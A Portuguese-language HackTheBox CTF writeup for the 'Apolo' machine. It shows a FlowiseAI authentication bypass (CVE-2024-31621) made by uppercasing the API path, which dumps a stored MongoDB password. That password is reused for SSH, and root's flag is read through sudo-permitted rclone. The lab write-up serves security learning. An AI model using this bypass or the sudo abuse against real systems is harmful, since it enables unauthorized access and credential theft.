# HackTheBox CTF — Binary Badlands: Apolo — Full Pwn Writeup

Por Lucas Albano

## Reconhecimento

Começamos a análise com o **nmap** para identificar os serviços disponíveis no alvo. Foi possível detectar um serviço SSH e um servidor web em execução.

```bash
nmap -A <IP_do_Alvo>
```

Podemos descobrir o domínio do alvo utilizando o **curl**.

```bash
curl -I <IP_do_Alvo>
```

Precisamos então adicionar o domínio ```àpolo.htb``` ao arquivo ```/etc/hosts``` e podemos então começar a explorar as páginas web. Analisando o código-fonte podemos notar referências a um subdomínio ```ai.apolo.htb``` que também adicionamos a ```/etc/hosts```.

Ao acessar ```ai.apolo.htb```, identificamos uma aplicação **FlowiseAI**, uma ferramenta low-code open-source para customizar fluxos de LLM e outras AI. Pesquisando por vulnerabilidades descobrimos o ```CVE-2024-31621``` de **Authentication Bypass**:

```text
The flowise version <= 1.6.5 is vulnerable to authentication bypass
vulnerability.
The code snippet

this.app.use((req, res, next) => {
>                 if (req.url.includes('/api/v1/')) {
>                     whitelistURLs.some((url) => req.url.includes(url)) ?
> next() : basicAuthMiddleware(req, res, next)
>                 } else next()
>             })


puts authentication middleware for all the endpoints with path /api/v1
except a few whitelisted endpoints. But the code does check for the case
sensitivity hence only checks for lowercase /api/v1 . Anyone modifying the
endpoints to uppercase like /API/V1 can bypass the authentication.
```

## Exploração

Podemos explorar a vulnerabilidade inserindo este código no console das DevTools do navegador ou utilizando o **BurpSuite** para modificar as requisições HTTP. Também, podemos simplesmente alterar ```/api/v1/``` para algo como ```/API/V1/```. De qualquer maneira, podemos navegar até ```/api/v1/credentials``` e obter:

```javascript
[
    {
        "id": "6cfda83a-b055-4fd8-a040-57e5f1dae2eb",
        "name": "MongoDB",
        "credentialName": "mongoDBUrlApi",
        "createdDate": "2024-11-14T09:02:56.000Z",
        "updatedDate": "2024-11-14T09:02:56.000Z"
    }
]
```

e acessando o ID especificado no endpoint ```ai.apolo.htb/Api/v1/credentials/6cfda83a-b055-4fd8-a040-57e5f1dae2eb``` obtemos as credenciais do banco de dados:

```javascript
{
  "id": "6cfda83a-b055-4fd8-a040-57e5f1dae2eb",
  "name": "MongoDB",
  "credentialName": "mongoDBUrlApi",
  "createdDate": "2024-11-14T09:02:56.000Z",
  "updatedDate": "2024-11-14T09:02:56.000Z",
  "plainDataObj": {
    "mongoDBConnectUrl": "mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true&w=majority"
  }
}
```

Também podemos fazer isso navegando diretamente pela aplicação até a aba de credenciais utilizando o BurpSuite. De qualquer forma, obtemos as credenciais ```lewis:C0mpl3xi3Ty!_W1n3``` que podem ser utilizadas para acessar a máquina por SSH e obter a flag de usuário.

```bash
ssh lewis@<IP_do_Alvo>
cat user.txt
```

## Escalação de Privilégio

Aqui podemos utilizar diferentes técnicas para encontrar vetores de escalação de privilégio. Eu apelei para utilizar ferramentas automatizadas como ```linpeas``` e ```enum4linux```. Depois de perder algum tempo tentando explorar alguns possíveis exploits acusados pelas ferramentas (erro de principiante) notei que o usuário lewis podia executar o comando ```/usr/bin/rclone``` como superusuário.

```text
[+] We can sudo without supplying a password!
Matching Defaults entries for lewis on apolo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User lewis may run the following commands on apolo:
    (ALL : ALL) NOPASSWD: /usr/bin/rclone
```

Podemos verificar isso com um simples:

```bash
sudo -l
```

Observando o ```--help``` do comando e fazendo pesquisas (leia-se chatGPT), descobrimos que o **rclone** é uma ferramenta de linha de comando para gerenciar e sincronizar arquivos entre sistemas de arquivos locais e serviços de armazenamento em nuvem. E mais importante, ele pode usar o comando ```cat```. Podemos então simplesmente utilizar o comando

```bash
sudo rclone cat /root/root.txt
```

e obter a flag de root.
